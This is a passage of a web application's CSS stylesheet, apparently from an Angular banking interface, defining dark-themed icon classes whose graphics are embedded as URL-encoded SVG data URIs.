      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_branch%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C1A20%2C20%2C0%2C1%2C1%2C1%2C21%2C20%2C20%2C0%2C0%2C1%2C21%2C1%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M33%2C17V13h0a2%2C2%2C0%2C0%2C0-2-2H11a2%2C2%2C0%2C0%2C0-2%2C2H9v4h2V29H9v2H33V29H31V17Zm-2-4v2H11V13ZM21%2C21v8H17V21Zm8%2C8H23V19H15V29H13V17H29Zm-2-4H25V21h2Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-bubble-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_bubble%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M26.22%2C13.89C24.7%2C11%2C21.15%2C9%2C17%2C9%2C11.48%2C9%2C7%2C12.58%2C7%2C17c0%2C3%2C2%2C5.48%2C5%2C6.86v5.41l5.23-2.82a9%2C9%2C0%2C0%2C0%2C1.88%2C1.62l11.14%2C6V28.66c3-1.37%2C5-3.91%2C5-6.86C35.25%2C17.65%2C31.28%2C14.29%2C26.22%2C13.89ZM9%2C17c0-3.31%2C3.58-6%2C8-6s8%2C2.69%2C8%2C6a5.51%2C5.51%2C0%2C0%2C1-2.79%2C4.52L14%2C25.94V22.52C11.08%2C21.63%2C9%2C19.51%2C9%2C17ZM28.25%2C27.32v3.42L20%2C26.32a6.54%2C6.54%2C0%2C0%2C1-1-.83l4.13-2.22A7.51%2C7.51%2C0%2C0%2C0%2C27%2C17a6.44%2C6.44%2C0%2C0%2C0-.13-1c3.63.56%2C6.38%2C2.93%2C6.38%2C5.82C33.25%2C24.31%2C31.17%2C26.43%2C28.25%2C27.32Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-chart-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_chart%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M17%2C29a4%2C4%2C0%2C0%2C1-4-3.81V23.09l4.94-2.63%2C1.81%2C3.4%2C11.61-6.18-.94-1.77-9.85%2C5.24-1.81-3.39L13%2C20.82V13H11V25.22A6%2C6%2C0%2C0%2C0%2C17%2C31H31V29Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-checkmark-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_checkmark%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpolygon%20class%3D%22cls-2%22%20points%3D%2231.9%2014.46%2015.3%2023.29%2011.77%2016.64%2010%2017.58%2014.46%2026%2032.84%2016.23%2031.9%2014.46%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-circle-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_circlearrows%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C1A20%2C20%2C0%2C1%2C1%2C1%2C21%2C20%2C20%2C0%2C0%2C1%2C21%2C1%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M31.45%2C26.81a12%2C12%2C0%2C0%2C1-21.16-.27l1.73-1a10%2C10%2C0%2C0%2C0%2C17.66.35l-3.21-1.7%2C7.84-4.9.32%2C9.23ZM26.59%2C10.41a12%2C12%2C0%2C0%2C0-16.16%2C4.85L7.37%2C13.62l.32%2C9.23L15.52%2C18l-3.32-1.77a10%2C10%2C0%2C0%2C1%2C17.67.32l1.73-1A11.94%2C11.94%2C0%2C0%2C0%2C26.59%2C10.41Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-creditCard-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_creditcard%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M21%2C23v2H11V23Zm14-8h0V27a4%2C4%2C0%2C0%2C1-4%2C4H11a4%2C4%2C0%2C0%2C1-4-4V15H7a4%2C4%2C0%2C0%2C1%2C4-4H31a4%2C4%2C0%2C0%2C1%2C4%2C4ZM11%2C29H21.44L33%2C22.85V19H9v8A2%2C2%2C0%2C0%2C0%2C11%2C29Zm22-2V25.12L25.7%2C29H31A2%2C2%2C0%2C0%2C0%2C33%2C27Zm0-12a2%2C2%2C0%2C0%2C0-2-2H11a2%2C2%2C0%2C0%2C0-2%2C2v2H33Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-currency-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_currency_bill%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M7%2C13V29H35V13Zm26%2C7.88L24.18%2C25.6A6.48%2C6.48%2C0%2C0%2C0%2C26%2C21c0-3.19-2.08-5.77-4.7-6v0H33ZM9%2C15h7.49L9%2C19Zm12%2C2c1.66%2C0%2C3%2C1.79%2C3%2C4s-1.34%2C4-3%2C4-3-1.79-3-4S19.34%2C17%2C21%2C17ZM9%2C21.22l8.5-4.5A6.61%2C6.61%2C0%2C0%2C0%2C16%2C21c0%2C3.24%2C2.14%2C5.86%2C4.82%2C6v0H9ZM25.84%2C27%2C33%2C23.18V27Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-docuarrow-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_docuarrow%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M11%2C9V33H24.13l5.09-2.67A4%2C4%2C0%2C0%2C0%2C31%2C27h0V9ZM27.73%2C28.85l-4%2C2.15H23V27h6A2%2C2%2C0%2C0%2C1%2C27.73%2C28.85ZM21%2C25v6H13V11H29v6H23V14l-7%2C4%2C7%2C4V19h6v6Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-docucheck-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_docucheck%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M11%2C9V33H24.14l5.08-2.7h0A4%2C4%2C0%2C0%2C0%2C31%2C27h0V9ZM29%2C27a2%2C2%2C0%2C0%2C1-1.27%2C1.85l-4%2C2.15H23V27Zm0-2H21v6H13V11H29ZM17.53%2C21.84%2C15%2C16.93%2C16.72%2C16l1.65%2C3.15L26.24%2C15l.94%2C1.77Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-document-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_document%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C1%2C41%2C21%2C20%2C20%2C0%2C0%2C1%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M11%2C9V33H24.13l5.08-2.7h0A4%2C4%2C0%2C0%2C0%2C31%2C27h0V9ZM29%2C27a2%2C2%2C0%2C0%2C1-1.27%2C1.85l-4%2C2.15H23V27Zm0-2H21v6H13V11H29ZM27%2C15H15V13H27ZM15%2C19V17h8v2Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-dollar-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_dollar%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M22.32%2C34.26H19.79v-3.8a9.09%2C9.09%2C0%2C0%2C1-5.15-2.56l-.18-.19%2C1.74-1.94.21.2a6.7%2C6.7%2C0%2C0%2C0%2C4.72%2C2.14c2.36%2C0%2C3.71-1%2C3.71-2.76%2C0-1.55-.95-2.34-4.23-3.52-3.74-1.34-5.51-2.5-5.51-5.51%2C0-2.6%2C1.75-4.37%2C4.7-4.78V7.74h2.53v3.76a8.53%2C8.53%2C0%2C0%2C1%2C4.62%2C2l.22.17-1.67%2C2-.21-.18A6.17%2C6.17%2C0%2C0%2C0%2C21%2C13.88c-2.14%2C0-3.31.82-3.31%2C2.31%2C0%2C1.27.4%2C2%2C4.2%2C3.33%2C4.25%2C1.53%2C5.54%2C2.87%2C5.54%2C5.72s-2%2C4.79-5.12%2C5.21Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-download-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_download%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M33%2C23v2a6%2C6%2C0%2C0%2C1-6%2C6H15a6%2C6%2C0%2C0%2C1-6-6V23h2v2a4%2C4%2C0%2C0%2C0%2C4%2C4H27a4%2C4%2C0%2C0%2C0%2C4-4V23ZM22%2C17V9H20v8H16.38L21%2C25l4.62-8Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-envelop-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_envelope%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M33%2C15h0V13H9V25a6%2C6%2C0%2C0%2C0%2C6%2C6H27a6%2C6%2C0%2C0%2C0%2C6-6V15ZM31%2C25a4%2C4%2C0%2C0%2C1-4%2C4H15a4%2C4%2C0%2C0%2C1-4-4h0V19.75l10%2C5.32%2C10-5.27Zm0-7.46L21%2C22.83%2C11%2C17.49V15H31Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-euro-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_euro%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M22%2C31c-3.13%2C0-5.75-3-6.64-7H21V22H15.07c0-.33-.07-.66-.07-1s0-.67.07-1H21V18H15.36c.89-4%2C3.52-7%2C6.64-7a6.26%2C6.26%2C0%2C0%2C1%2C5.09%2C3.16l1.73-.92C27.17%2C10.67%2C24.74%2C9%2C22%2C9c-4.2%2C0-7.71%2C3.83-8.71%2C9H11v2h2c0%2C.33%2C0%2C.66%2C0%2C1s0%2C.67%2C0%2C1H11v2h2.3c1%2C5.17%2C4.52%2C9%2C8.71%2C9%2C2.74%2C0%2C5.16-1.67%2C6.8-4.25l-1.71-.91A6.25%2C6.25%2C0%2C0%2C1%2C22%2C31Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-jbp-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_GBP%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M27.17%2C26.86a4%2C4%2C0%2C0%2C1-3.73%2C2.59%2C3.65%2C3.65%2C0%2C0%2C1-1.54-.37v0L19%2C27.56V21h6V19H19V15h0a4%2C4%2C0%2C0%2C1%2C4-4%2C3.94%2C3.94%2C0%2C0%2C1%2C2.56%2C1l1.88-1A6%2C6%2C0%2C0%2C0%2C17%2C15h0v4H15v2h2v6.29l-4%2C2.13.94%2C1.77%2C3.8-2%2C2.83%2C1.51a5.79%2C5.79%2C0%2C0%2C0%2C.52.28l.37.13a5.83%2C5.83%2C0%2C0%2C0%2C2%2C.38A6%2C6%2C0%2C0%2C0%2C29%2C27.8Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-info-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_info%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M23%2C13a2%2C2%2C0%2C1%2C1-2-2%2C2%2C2%2C0%2C0%2C1%2C2%2C2m12%2C8A14%2C14%2C0%2C1%2C0%2C21%2C35%2C14%2C14%2C0%2C0%2C0%2C35%2C21m2%2C0A16%2C16%2C0%2C1%2C1%2C21%2C5%2C16%2C16%2C0%2C0%2C1%2C37%2C21M23%2C17.09l-4.74%2C2.52.94%2C1.77%2C1.8-1V31h2Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-laptop-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_laptop%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M31%2C25V11H11V25H7a6%2C6%2C0%2C0%2C0%2C6%2C6H29a6%2C6%2C0%2C0%2C0%2C6-6ZM13%2C13h8.43L13%2C17.48Zm0%2C6.75L25.69%2C13H29V25H13ZM29%2C29H13a4%2C4%2C0%2C0%2C1-3.46-2H32.47A4%2C4%2C0%2C0%2C1%2C29%2C29Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-lightbulb-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_lightbulb%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C1%2C41%2C21%2C20%2C20%2C0%2C0%2C1%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M17%2C29h8v2H17Zm2%2C6h4V33H19Zm6.44-18.14-.94-1.77L21%2C17%2C17.5%2C15.1l-.94%2C1.77L21%2C19.22h0Zm-.44%2C7V27H17V23.87a8%2C8%2C0%2C1%2C1%2C8%2C0ZM27%2C17a6%2C6%2C0%2C1%2C0-8%2C5.63V25h4V22.63A6%2C6%2C0%2C0%2C0%2C27%2C17Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-list-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_list%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M15%2C11H31v2H15Zm0%2C14H31V23H15Zm0%2C6H31V29H15Zm0-12H31V17H15Zm-3-6a1%2C1%2C0%2C1%2C0-1-1%2C1%2C1%2C0%2C0%2C0%2C1%2C1m0%2C12a1%2C1%2C0%2C1%2C0-1-1%2C1%2C1%2C0%2C0%2C0%2C1%2C1m0-6a1%2C1%2C0%2C1%2C0-1-1%2C1%2C1%2C0%2C0%2C0%2C1%2C1m0%2C12a1%2C1%2C0%2C1%2C0-1-1%2C1%2C1%2C0%2C0%2C0%2C1%2C1%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-lock-dark[_ngcontent-yta-c101] {
      background-image: url("data:image/svg+xml;charset=US-ASCII,%0A%3Csvg%20id%3D%22Layer_1%22%20data-name%3D%22Layer%201%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%2040%2040%22%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill%3A%23002d72%3B%7D.cls-2%7Bfill%3A%23fff%3B%7D%3C/style%3E%3C/defs%3E%3Ctitle%3Ebf_primary_circle_b_rgb_lock%3C/title%3E%3Cpath%20class%3D%22cls-1%22%20d%3D%22M21%2C41A20%2C20%2C0%2C1%2C0%2C1%2C21%2C20%2C20%2C0%2C0%2C0%2C21%2C41%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3Cpath%20class%3D%22cls-2%22%20d%3D%22M27%2C15V13h0a6%2C6%2C0%2C1%2C0-12%2C0v2H11v2h0v8a6%2C6%2C0%2C0%2C0%2C6%2C6h8a6%2C6%2C0%2C0%2C0%2C6-6V15ZM17%2C13a4%2C4%2C0%2C1%2C1%2C8%2C0h0v2H17ZM29%2C25a4%2C4%2C0%2C0%2C1-4%2C4H17a4%2C4%2C0%2C0%2C1-2.89-1.23L29%2C19.88Zm0-7.39L13.14%2C26A3.87%2C3.87%2C0%2C0%2C1%2C13%2C25V17H29Z%22%20transform%3D%22translate%28-1%20-1%29%22/%3E%3C/svg%3E");
      background-repeat: no-repeat;
      width: 20px;
      height: 24px;
      background-size: 20px 24px
    }

    .cbolui-icon-mapping-dark[_ngcontent-yta-c101] {
